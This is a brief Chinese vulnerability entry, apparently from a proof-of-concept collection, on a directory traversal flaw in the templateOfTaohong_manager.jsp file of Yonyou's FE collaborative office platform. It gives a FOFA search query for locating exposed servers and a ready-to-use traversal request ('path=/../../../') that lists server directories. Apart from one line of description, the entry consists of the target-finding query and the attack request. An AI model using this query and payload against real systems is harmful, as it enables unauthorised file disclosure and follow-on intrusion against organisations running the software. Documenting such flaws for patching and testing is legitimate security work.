# 用友 FE协作办公平台 templateOfTaohong_manager.jsp 目录遍历漏洞

## 漏洞描述

用友 FE协作办公平台 templateOfTaohong_manager.jsp文件存在目录遍历漏洞，通过漏洞攻击者可以获取目录文件等信息，导致进一步攻击

## 漏洞影响

```
用友 FE协作办公平台
```

## FOFA

```
"FE协作"
```

## 漏洞复现

登录页面

![image-20220520141413849](./images/202205201414968.png)

验证POC

```
/system/mediafile/templateOfTaohong_manager.jsp?path=/../../../
```

![image-20220520141519859](./images/202205201415920.png)